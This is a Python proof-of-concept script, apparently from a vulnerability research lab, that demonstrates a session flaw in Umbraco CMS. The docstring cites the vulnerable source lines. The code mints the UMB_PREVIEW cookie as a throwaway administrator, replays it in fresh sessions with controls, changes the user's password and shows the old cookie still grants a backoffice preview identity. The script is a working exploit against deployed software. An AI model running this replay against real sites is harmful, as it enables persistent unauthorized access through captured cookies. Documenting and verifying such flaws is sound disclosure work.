#!/usr/bin/env python3
"""
VULN-025 — Preview token mints a full, non-expiring, non-revocable backoffice identity

Vulnerable code (targets/Umbraco-CMS/src):
  * Umbraco.Web.Common/Preview/UserBasedPreviewTokenGenerator.cs:30
        token = EncryptionHelper.Encrypt(userKey.ToString(), _dataProtectionProvider)   # ONLY the user GUID
  * Umbraco.Web.Common/Preview/UserBasedPreviewTokenGenerator.cs:44-46
        if (user is { IsApproved: true, IsLockedOut: false }) return user.Key            # no expiry / no stamp
  * Umbraco.Core/Services/PreviewService.cs:131,141-142
        VerifyAsync(cookieValue) -> CreateUserPrincipalAsync(userKey) -> GetUmbracoIdentity()  # FULL identity
  * Umbraco.Web.Common/Middleware/PreviewAuthenticationMiddleware.cs:62-69
        context.User.AddIdentity(backOfficeIdentityAttempt.Result!)                      # injected onto FE principal
  * DI: Umbraco.Web.Common/DependencyInjection/UmbracoBuilderExtensions.cs:223
        AddUnique<IPreviewTokenGenerator, UserBasedPreviewTokenGenerator>()  # overrides the Core Noop -> live path
  * Cookie name: Umbraco.Core/Constants-Web.cs:13  PreviewCookieName = "UMB_PREVIEW"

Class: Insufficient session expiration / non-revocable bearer of a full identity — CWE-613, CWE-522, CWE-384.

Flaw (plain English):
  Everything else that authenticates a backoffice user (the identity cookie, OpenIddict reference
  tokens) is bound to the user's ASP.NET-Identity *security stamp* and is rotated on logout /
  password-change / 2FA-reset. The PREVIEW token is not: it is the DataProtection-encrypted user
  GUID and nothing else — no expiry claim, no stamp. VerifyAsync re-checks only IsApproved and
  IsLockedOut. When that cookie rides a front-end (non-backoffice) request, PreviewAuthenticationMiddleware
  attaches a FULL backoffice ClaimsIdentity to the request principal. So a captured UMB_PREVIEW value
  is an indefinitely-valid, non-revocable bearer of the minting user's backoffice identity on the
  front end (draft/protected content read, front-end authorization decisions run as that user). The
  cookie is DP-encrypted + HttpOnly, so it is not *forgeable* — impact is conditional on cookie capture.

Exploitation idea (fully headless):
  1. Enter preview once as a user -> server mints UMB_PREVIEW (Set-Cookie, HttpOnly, no Expires/Max-Age).
  2. Replay ONLY that cookie in a brand-new session (no UMB_UCONTEXT, no bearer) against a front-end
     path. The server injects the backoffice preview toolbar (<umb-website-preview>, preview.js) into
     the page -> proof the standalone cookie is treated as an authenticated backoffice preview identity.
     Control: an INVALID UMB_PREVIEW value produces no toolbar (so the effect is the verify path, not luck).
  3. Rotate the minting user's credentials (admin changes their password -> rotates the security stamp,
     which SHOULD invalidate every token/session). Replay the SAME pre-change cookie -> toolbar STILL
     injected == the preview token is non-revocable and survives a credential change.

A successful run proves: a single captured preview cookie remains a working, full backoffice preview
identity on the front end *after the account's password has been changed* — an unrevocable session bearer.

Safety: uses a throwaway random-suffixed Administrators-group user for the credential-rotation test, so
the shared admin account is never modified.
"""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import _common as c
import requests

VID = "VULN-025"
FE = c.BASE_URL  # front-end origin
TOOLBAR_MARKER = "<umb-website-preview"          # backoffice preview toolbar element (preview identity active)
TOOLBAR_SCRIPT = "/umbraco/website/preview.js"


def toolbar_active(cookie_value):
    """Front-end GET / in a FRESH session carrying only UMB_PREVIEW (no UMB_UCONTEXT).
    Returns (is_active, body_len, body). Preview toolbar => the FE principal has the backoffice identity."""
    s = requests.Session()
    if cookie_value is not None:
        s.cookies.set("UMB_PREVIEW", cookie_value)
    # generous timeout: the shared lab host can be slow to render the front-end under concurrent load
    r = s.get(f"{FE}/", timeout=90, allow_redirects=False)
    body = r.text
    return (TOOLBAR_MARKER in body), len(body), body


def pick_document(admin):
    """Any existing document works (DefaultUrlProvider.GetPreviewUrlAsync is unconditional); else create one."""
    r = admin.get("/tree/document/root?take=1")
    items = r.json().get("items", []) if r.status_code == 200 else []
    if items:
        return items[0]["id"]
    dt = c.create_doctype(admin)
    return c.create_document(admin, dt["id"], f"PreviewSeed {c.rnd(2)}", dt["propAlias"], "seed")


def main() -> int:
    c.banner(VID, "Preview cookie = non-expiring, non-revocable full backoffice identity",
             "UserBasedPreviewTokenGenerator.cs:30/44 (no expiry/stamp) + PreviewAuthenticationMiddleware.cs:69 (full identity injected)")

    admin = c.admin_client()
    c.log("SETUP", "admin authenticated to Management API")

    doc_id = pick_document(admin)
    c.log("SETUP", f"document used to enter preview: {doc_id}")

    # throwaway Administrators-group user -> we can rotate ITS password without touching shared admin creds
    gid = c.group_key_by_alias(admin, "admin")
    if gid is None:
        for g in c.get_user_groups(admin):
            if (g.get("alias") or "").lower().startswith("admin"):
                gid = g.get("id")
                break
    if gid is None:
        return c.verdict(VID, "FAILED", "could not locate the Administrators user group to provision a victim")
    pw1 = f"Preview_{c.rnd(6)}!aA1"
    victim = c.create_user(admin, [gid])
    c.set_password_for_user(admin, victim["id"], pw1)
    c.log("SETUP", f"created throwaway Administrators user {victim['email']} (id {victim['id']})")

    ok = True

    # ---- STEP 1: victim enters preview -> server mints UMB_PREVIEW ----
    c.log("STEP", "victim logs in and enters preview (GET /document/{id}/preview-url) -> server mints UMB_PREVIEW")
    vc = c.ApiClient(victim["email"], pw1, label="victim")
    r_prev = vc.session.get(
        f"{c.MGMT}/document/{doc_id}/preview-url?providerAlias=umbDocumentUrlProvider",
        timeout=60, allow_redirects=False)
    set_cookie = r_prev.headers.get("Set-Cookie", "")
    umb_preview = vc.session.cookies.get("UMB_PREVIEW")
    if r_prev.status_code != 200 or not umb_preview:
        c.log("FAIL", f"preview-url returned {r_prev.status_code}, UMB_PREVIEW captured={bool(umb_preview)}: {r_prev.text[:200]}")
        return c.verdict(VID, "FAILED", "could not mint a preview cookie")
    c.log("PROOF", f"minted UMB_PREVIEW (len {len(umb_preview)}); Set-Cookie: {set_cookie[:160]}")
    low = set_cookie.lower()
    has_expiry = ("expires=" in low) or ("max-age=" in low)
    c.log("PROOF", f"cookie attributes -> httponly={'httponly' in low}, "
                   f"has Expires/Max-Age={has_expiry} (absent => session cookie, no TTL); token payload = encrypted user GUID only")

    # ---- STEP 2: standalone replay in a fresh session (no UMB_UCONTEXT) ----
    c.log("STEP", "replay ONLY UMB_PREVIEW in a brand-new session (no UMB_UCONTEXT, no bearer) -> GET /")
    active_valid, len_valid, _ = toolbar_active(umb_preview)
    if active_valid:
        c.log("PROOF", f"backoffice preview toolbar injected ({TOOLBAR_MARKER} + {TOOLBAR_SCRIPT}), body={len_valid}B "
                       "=> the standalone cookie IS treated as an authenticated backoffice preview identity")
    else:
        c.log("FAIL", f"no preview toolbar with the valid cookie (body={len_valid}B)")
        ok = False

    # controls: an invalid cookie and no cookie must NOT trip the toolbar (so the effect is the verify path)
    active_bad, len_bad, _ = toolbar_active("CfDJ8_invalid_" + ("A" * 100))
    active_none, len_none, _ = toolbar_active(None)
    if not active_bad and not active_none:
        c.log("PROOF", f"controls: invalid cookie -> no toolbar ({len_bad}B), no cookie -> no toolbar ({len_none}B) "
                       "=> toolbar is gated on successful token verification, not incidental")
    else:
        c.log("FAIL", f"control failed: invalid-cookie toolbar={active_bad}, no-cookie toolbar={active_none}")
        ok = False

    # ---- STEP 3: rotate the victim's password (rotates the security stamp) then replay the OLD cookie ----
    c.log("STEP", "admin changes the victim's password (rotates the ASP.NET-Identity security stamp -> should kill all tokens)")
    c.set_password_for_user(admin, victim["id"], f"Preview_{c.rnd(6)}!zZ9")
    c.log("STEP", "replay the SAME pre-change UMB_PREVIEW cookie in a fresh session -> GET /")
    active_after, len_after, body_after = toolbar_active(umb_preview)
    if active_after:
        c.log("PROOF", f"preview toolbar STILL injected after the password change (body={len_after}B) "
                       "=> the preview token is NON-REVOCABLE: it survives credential rotation (no stamp/expiry binding)")
    else:
        c.log("FAIL", f"toolbar absent after password change (body={len_after}B) — token appears to be revoked")
        ok = False

    # persist decisive request/response
    here = os.path.dirname(__file__)
    with open(os.path.join(here, "request.http"), "w") as f:
        f.write("# (1) Mint the preview cookie (as the victim backoffice user)\n"
                f"GET {c.MGMT}/document/{doc_id}/preview-url?providerAlias=umbDocumentUrlProvider HTTP/1.1\n"
                "Cookie: UMB_UCONTEXT=<victim-backoffice-session>\n"
                "Authorization: Bearer <victim-bearer>\n\n"
                "# --> Response sets:  Set-Cookie: UMB_PREVIEW=<token>; path=/; samesite=lax; httponly   (no Expires/Max-Age)\n\n"
                "# (2) The decisive replay: ONLY the captured preview cookie, brand-new session, no backoffice login\n"
                f"GET {FE}/ HTTP/1.1\n"
                "Cookie: UMB_PREVIEW=<captured-token>\n\n"
                "# (3) Same request, replayed AFTER the account's password was changed (still works).\n")
    with open(os.path.join(here, "response.txt"), "w") as f:
        f.write("Set-Cookie (mint): " + (set_cookie or "<none>") + "\n\n")
        f.write(f"GET / with VALID UMB_PREVIEW (fresh session)          -> preview toolbar present = {active_valid}  ({len_valid} B)\n")
        f.write(f"GET / with INVALID UMB_PREVIEW (control)              -> preview toolbar present = {active_bad}  ({len_bad} B)\n")
        f.write(f"GET / with NO cookie (control)                        -> preview toolbar present = {active_none}  ({len_none} B)\n")
        f.write(f"GET / with SAME cookie AFTER password change          -> preview toolbar present = {active_after}  ({len_after} B)\n\n")
        # show the injected toolbar lines as evidence
        for line in body_after.splitlines():
            if TOOLBAR_MARKER in line or TOOLBAR_SCRIPT in line:
                f.write("injected: " + line.strip()[:200] + "\n")

    if ok:
        return c.verdict(VID, "CONFIRMED",
                         "captured preview cookie is a full backoffice preview identity that survives a password change (non-revocable)")
    return c.verdict(VID, "FAILED", "could not demonstrate the persistent, non-revocable preview identity")


if __name__ == "__main__":
    sys.exit(main())
